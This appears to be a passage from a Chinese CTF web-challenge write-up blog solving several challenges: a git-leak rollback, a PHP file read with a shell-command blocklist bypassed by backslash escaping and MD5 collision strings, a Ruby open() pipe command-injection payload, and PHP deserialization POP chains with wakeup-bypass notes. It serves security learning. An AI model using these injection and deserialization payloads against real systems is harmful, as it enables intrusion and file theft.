<p>我们可以在环境变量里面添加上&#x2F;tmp目录，</p>
<p>同时在tmp目录下创建一个恶意的 ports-alive文件</p>
<p>root会调用这个恶意的文件</p>
<p>从而完成注入</p>
<p><img src="C:\Users\lenovo\Desktop\life\学习wp\312.png" alt="312"></p>
<p>比赛虽然环境有点草台班子</p>
<p>但是</p>
<p>题目质量很高</p>
<h2 id="17-NCTF-2018-全球最大交友网站"><a href="#17-NCTF-2018-全球最大交友网站" class="headerlink" title="17.[NCTF 2018]全球最大交友网站"></a>17.[NCTF 2018]全球最大交友网站</h2><p>是一个git泄露回滚</p>
<p>使用一个超级好用的脚本</p>
<p> scrabble <a target="_blank" rel="noopener" href="http://node4.anna.nssctf.cn:28343/">http://node4.anna.nssctf.cn:28343/</a></p>
<p>把git给拿下来然后在本地git仓库回滚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git log //显示修改历史</span><br><span class="line">git show head +名字//展示修改记录得到flag</span><br></pre></td></tr></table></figure>

<h2 id="18-安洵杯-2019-easy-web"><a href="#18-安洵杯-2019-easy-web" class="headerlink" title="18.[安洵杯 2019]easy_web"></a>18.[安洵杯 2019]easy_web</h2><p>img存在任意文件读取，直接读取index.php</p>
<p>编码方式是hex加密后两次base64加密</p>
<p>读取到index。php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"> </span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> ` `;<span class="comment">//输出运行结果</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>简单的md5强碰撞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;</span><br><span class="line">b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>

<p>过滤了一堆。。。没过滤反斜杠\</p>
<p>直接l\s   ca\t &#x2F;flag</p>
<p>直接得到flag</p>
<p>注意cat+flag，因为没有+号的话也会被解析成路径</p>
<p>在这里也可以使用sort &#x2F;flag</p>
<h2 id="19-第五空间-2023-png图片转换器"><a href="#19-第五空间-2023-png图片转换器" class="headerlink" title="19.[第五空间]2023 png图片转换器"></a>19.[第五空间]2023 png图片转换器</h2><p>上来给了源码</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = <span class="title class_">Digest</span><span class="symbol">:</span><span class="symbol">:MD5</span>.hexdigest(<span class="title class_">Time</span>.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; |<span class="params">f</span>|</span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + <span class="title class_">Base64</span>.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>网站提供了两个路由，一个是上传，一个是浏览</p>
<p>然而上传的是地方已经处理的名字和文件的后缀是png，没办法上传🐎</p>
<p>同时在读取文件的地方存在的任意文件读取的问题由于过滤了..&#x2F;难以做到目录穿越</p>
<p>这里存在rce的问题</p>
<h3 id="ruby-file-open漏洞"><a href="#ruby-file-open漏洞" class="headerlink" title="ruby file.open漏洞"></a>ruby file.open漏洞</h3><p>在尝试打开一个文件的时候，是可以接受管道符的</p>
<p>在这里使用管道符去进行链接，使用``去作为执行</p>
<h3 id="在linux里面-的作用"><a href="#在linux里面-的作用" class="headerlink" title="在linux里面``的作用"></a>在linux里面``的作用</h3><p>凡是打上反引号的命令，首先将反引号内的命令执行一次，然后再将已经执行过的命令得到的结果再执行一次，就可以得到我们反引号的输出</p>
<p>这里可以使用echo讲所得的内容输出到目标的png里面，用管道符号去链接</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| `echo ZW52IA== |base64 -d` &gt; 7fd42952478a381f318b19cf148f48c0.png</span><br></pre></td></tr></table></figure>

<p>然后得到flag</p>
<h2 id="20-pop子和pipi美"><a href="#20-pop子和pipi美" class="headerlink" title="20.pop子和pipi美"></a>20.pop子和pipi美</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//flag is in f14g.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Popuko</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$No_893</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">POP_TEAM_EPIC</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$WEBSITE</span>  = <span class="string">&quot;MANGA LIFE WIN&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;No_893);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$anti_takeshobo</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$anti_takeshobo</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipimi</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pipi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PIPIPMI</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$h</span> = <span class="string">&quot;超喜欢POP子ww,你也一样对吧(举刀)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Pipi美永远不会生气ww&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pipi = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$corepop</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Goodsisters</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">PopukoPipimi</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$is</span> = <span class="string">&quot;Good sisters&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kiminonawa</span>,<span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;kiminonawa = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to HNCTF2022 ,&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;This is &#x27;</span>.<span class="variable language_">$this</span>-&gt;kiminonawa.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;kiminonawa;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;kiminonawa)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;仲良ピース!&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;kiminonawa = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Goodsisters</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop_EP&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;pop_EP&#x27;</span>] == <span class="string">&quot;ep683045&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;欸嘿,你也喜欢pop子~对吧ww&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击点在popuko类的append函数的地方存在文件包含</p>
<p>链子的结尾</p>
<p>然后链子的开头，位于Goodsisters类的wakeup，这里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;kiminonawa = <span class="string">&quot;index.php&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>触发tostring，然后只要str类里面没有kiminonawa成员就会触发get（）</p>
<h3 id="序列化可以序列化不存在的成员"><a href="#序列化可以序列化不存在的成员" class="headerlink" title="序列化可以序列化不存在的成员"></a>序列化可以序列化不存在的成员</h3><p>直接构造一个p，序列化</p>
<p>于是完成了构造</p>
<p>下面是payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Popuko</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$No_893</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipimi</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pipi</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Goodsisters</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$kiminonawa</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$pop</span>=<span class="keyword">new</span> <span class="title class_">Goodsisters</span>;</span><br><span class="line">    <span class="variable">$pop</span>-&gt;str=<span class="keyword">new</span> <span class="title class_">Pipimi</span>;</span><br><span class="line">    <span class="variable">$pop</span>-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Popuko</span>;    </span><br><span class="line"><span class="variable">$hello</span>=<span class="keyword">new</span> <span class="title class_">Goodsisters</span>;</span><br><span class="line"><span class="variable">$hello</span>-&gt;kiminonawa=<span class="variable">$pop</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pop</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果不ur编码，一部分内容会无法传上去</p>
<h2 id="21-蓝帽杯2023初赛-funny-php"><a href="#21-蓝帽杯2023初赛-funny-php" class="headerlink" title="21.蓝帽杯2023初赛 funny_php"></a>21.蓝帽杯2023初赛 funny_php</h2><p>这初赛的水平真的蛮高的，几十行的代码牛魔硬生生看了好久</p>
<p><em>真的答辩</em></p>
<p>上源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saferman</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span> = True;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check === True)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;secret&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check=False;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;my_secret.flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;my_secret.flag&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>起手先whatweb扫一下 php版本7.4.33（记住这个，后面要考）</p>
<p>如果直接传值传入my_secret.flag，会被php处理掉，</p>
<h3 id="php对非法变量名字的处理"><a href="#php对非法变量名字的处理" class="headerlink" title="php对非法变量名字的处理"></a>php对非法变量名字的处理</h3><blockquote>
<p>变量中的变量名，其中的点和下划线会被转换成下划线</p>
</blockquote>
<p>这里需要一个tips</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_，但是会出现转换错误导致接下来如果该参数名中还有非法字符并不会继续转换成下划线_，也就是说如果中括号[出现在前面，那么中括号[还是会被转换成下划线_，但是因为出错导致接下来的非法字符并不会被转换成下划线_</span><br></pre></td></tr></table></figure>

<p>这里传值传入my]secret.flag</p>
<p>然后就是基本的反序列化，这里需要绕过wakeup方法</p>
<h3 id="绕过wakeup方法总结"><a href="#绕过wakeup方法总结" class="headerlink" title="绕过wakeup方法总结"></a>绕过wakeup方法总结</h3><h4 id="1-cve-2016-7124"><a href="#1-cve-2016-7124" class="headerlink" title="1.cve-2016-7124"></a>1.cve-2016-7124</h4><blockquote>
<p>这里对版本有要求</p>
<p>PHP5:&lt;5.6.25     PHP7:&lt;7.0.10</p>
</blockquote>
<p>对象的属性数量大于真实值，这里用不了</p>
<h4 id="2-php-issue-9618v"><a href="#2-php-issue-9618v" class="headerlink" title="2.php issue#9618v"></a>2.php issue#9618v</h4><p><a target="_blank" rel="noopener" href="https://github.com/php/php-src/issues/9618">php issue#9618</a>提到了最新版wakeup()的一种bug，可以通过在反序列化后的字符串中包含字符串长度错误的变量名使反序列化在__wakeup之前调用__destruct()函数，最后绕过__wakeup()，</p>
<blockquote>
<p>版本</p>
<ul>
<li>7.4.x -7.4.30</li>
<li>8.0.x</li>
</ul>
</blockquote>
<p>在以下情况下也会触发此事件。</p>
<ul>
